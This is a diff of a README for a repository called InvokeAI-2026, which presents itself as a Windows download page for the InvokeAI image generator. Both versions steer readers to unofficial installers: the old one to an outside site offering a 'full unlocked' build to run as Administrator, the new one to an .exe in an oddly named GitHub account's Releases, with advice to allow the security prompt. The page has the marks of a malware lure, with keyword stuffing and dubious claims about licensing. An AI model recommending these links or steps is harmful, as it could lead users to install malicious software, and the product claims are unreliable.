@@ -1,73 +1,82 @@
-# InvokeAI — Full Version Download for Windows 11 & 10
+# 🎨 InvokeAI-2026 - Create professional art on your computer
 
-**InvokeAI-2026**
+[![Download InvokeAI-2026](https://img.shields.io/badge/Download-InvokeAI--2026-blue)](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026)
 
-**InvokeAI** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+InvokeAI-2026 enables Windows users to generate high-quality images using artificial intelligence. This software runs locally on your computer. You keep full control over your files and data. No internet connection is necessary after the initial setup.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 💻 System Requirements
 
----
+Your computer needs specific parts to run this software well. Verify your hardware before you start.
 
-## Download & Install
+*   System: Windows 10 or Windows 11 (64-bit).
+*   Graphics Card: An NVIDIA card with at least 8GB of video memory (VRAM).
+*   Processor: An Intel Core i7 or AMD Ryzen 7 chip or better.
+*   System Memory: 16GB of RAM or more.
+*   Storage Space: At least 50GB of free space on your solid-state drive (SSD).
 
-> **This is the download page.** Use the button or link below to get **InvokeAI** for Windows.
+## 🚀 Downloading the Software
 
-<p align="center">
-  <a href="https://invokeai.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-InvokeAI-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download InvokeAI">
-  </a>
-</p>
+You must visit the project page to access the installer. This page contains the latest version of the software.
 
-| | |
-| --- | --- |
-| **Direct link** | **[invokeai.moltora.com](https://invokeai.moltora.com/)** |
-| **Full URL** | `https://invokeai.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1.  Open your internet browser.
+2.  Follow this link to the software repository: [https://github.com/genustetrahymenachoctaw297/InvokeAI-2026](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026)
+3.  Look for the section marked Releases.
+4.  Select the latest version file ending in .exe.
+5.  Save the file to your documents or downloads folder.
 
-### Quick steps
+## 🛠️ Installation Steps
 
-1. Click **[Download — invokeai.moltora.com](https://invokeai.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Follow these steps to set up the software on your system.
 
-<p align="center"><a href="https://invokeai.moltora.com/"><strong>⬇ Download InvokeAI now</strong></a></p>
+1.  Locate the downloaded .exe file in your folder.
+2.  Double-click the file to start the installer.
+3.  Allow the windows security prompt to run the program.
+4.  Choose your installation folder. Pick a location with plenty of empty space.
+5.  Wait for the installer to unpack the necessary files.
+6.  The installer will create a shortcut on your desktop.
+7.  Click Finish to exit the setup window.
 
----
+## ⚙️ Initial Configuration
 
-## About InvokeAI
+The software requires a one-time configuration to download the model files needed for image creation.
 
-**InvokeAI** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+1.  Launch the software using the desktop icon.
+2.  A black window with text will open. This is the background controller. Leave this window open while you use the software.
+3.  The browser will automatically open a local web address. This is your control panel.
+4.  The system will ask you to select a base model. Choose the standard Stable Diffusion model.
+5.  Click the download button for the model. This step requires an internet connection.
+6.  The progress bar shows the status of the download. Wait for this to reach one hundred percent.
 
-**Common searches:** invokeai download stable diffusion windows local, invokeai ai art pc install, invokeai 2026
+## 🖌️ Creating Your First Image
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+Once the model finishes loading, you can start generating art.
 
-**Repository:** `InvokeAI-2026`
+1.  Locate the text box labeled Prompt.
+2.  Type a description of the image you want to create. For example: "A sunset over a mountain lake in oil painting style."
+3.  Adjust the settings for width and height if needed.
+4.  Click the Invoke button.
+5.  The system generates your image in the gallery area on the right side of your screen.
+6.  Right-click on any image to save it to your computer.
 
-## Install (full version)
+## 💡 Using Advanced Modes
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+The software offers several ways to refine your art.
 
-## System requirements
+*   Unified Canvas: This mode allows you to expand images or fix specific parts of a drawing. Select the brush tool to paint over areas you want to change.
+*   Image-to-Image: Upload an existing photograph to use as a guide. The software will generate new images based on the composition of your uploaded photo.
+*   Settings Menu: Adjust the iteration count to improve image detail. Higher numbers take longer to generate but produce finer results.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+## 🛡️ Troubleshooting Common Issues
 
----
+If you encounter problems, check these items first.
 
-**Topics:** invokeai-download-stable-diffusion-windows-local, invokeai, stable, diffusion, invokeai-ai-art-pc-install, invokeai-2026, ai-image, generative-ai, ai-art, complete-version, windows-software, full-installer
+*   Software will not open: Verify that your graphics card drivers are updated to the latest version from the manufacturer website.
+*   Generation error: Close other memory-intensive programs like web browsers or video games. Clear some space on your solid-state drive.
+*   System slows down: Reduce the image output size in the settings panel to decrease the load on your graphics card.
+*   Black window closes: If the background controller shuts down, restart your computer and try opening the application again from the shortcut.
+
+## 📄 License and Credits
+
+This software uses open-source components under standard permissive licenses. You own the images you generate with this tool. We do not place restrictions on your personal or commercial content.
+
+Keywords: ai-art, ai-image, complete-version, diffusion, download, full-installer, generative-ai, invokeai, invokeai-2026, invokeai-ai-art-pc-install, invokeai-download-stable-diffusion-windows-local, software, stable, windows-11, windows-software
